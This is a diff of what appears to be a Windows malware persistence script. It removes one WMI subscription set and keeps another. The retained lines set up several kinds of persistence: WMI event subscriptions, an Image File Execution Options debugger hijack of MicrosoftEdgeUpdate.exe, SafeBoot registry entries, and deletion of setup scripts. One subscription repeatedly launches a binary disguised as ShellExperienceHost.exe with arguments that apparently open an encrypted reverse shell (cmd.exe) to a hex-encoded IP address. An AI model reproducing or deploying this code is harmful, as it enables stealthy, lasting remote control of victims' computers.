@@ -1,13 +1,8 @@
 sc delete Help
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="SCM"' DELETE
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="MCS"' DELETE
 
 del /F /S /Q /A "%WINDIR%\Setup\Scripts\*.cmd"
 del /F /S /Q /A "%ProgramData%\USOShared\log.cmd"
-
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*SCM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='SCM'\" | Remove-WmiObject"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='SCM'\" | Remove-WmiObject"
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*MCS*' -or $_.Consumer -like '*MCS*' } | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
@@ -34,17 +29,9 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Pe
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
 
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
-
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="MCS", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="MCS", CommandLineTemplate="%ProgramData%\config..\ShellExperienceHost.exe --ssl-servername login.microsoft.com --ssl -n 0xc17c21b4 448 -e cmd.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"MCS\"", Consumer="CommandLineEventConsumer.Name=\"MCS\""
-
-powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SCM'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
-powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SCM'; CommandLineTemplate='%WINDIR%\System32\cmd.exe /c start setup.exe'} | Out-Null"
-powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"SCM\"'; Consumer='CommandLineEventConsumer.Name=\"SCM\"'} | Out-Null"
 
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl-servername login.microsoft.com --ssl -n 0xc17c21b4 448 -e cmd.exe'} | Out-Null"
